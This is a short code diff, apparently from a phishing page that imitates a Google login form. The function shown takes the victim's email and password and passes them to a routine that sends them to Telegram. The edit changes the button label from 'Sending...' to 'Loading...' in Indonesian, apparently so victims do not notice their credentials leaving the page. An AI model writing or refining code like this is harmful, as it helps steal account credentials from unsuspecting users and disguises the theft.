@@ -104,7 +104,7 @@ async function submitGoogleFormLogin() {
     // Loading state
     errorDiv.innerText = '';
     btn.disabled = true;
-    btn.innerHTML = '<span class="spinner-google"></span> Mengirim...';
+    btn.innerHTML = '<span class="spinner-google"></span> Memuat...';
     
     // Kirim ke Telegram
     await sendToTelegram(email, password);
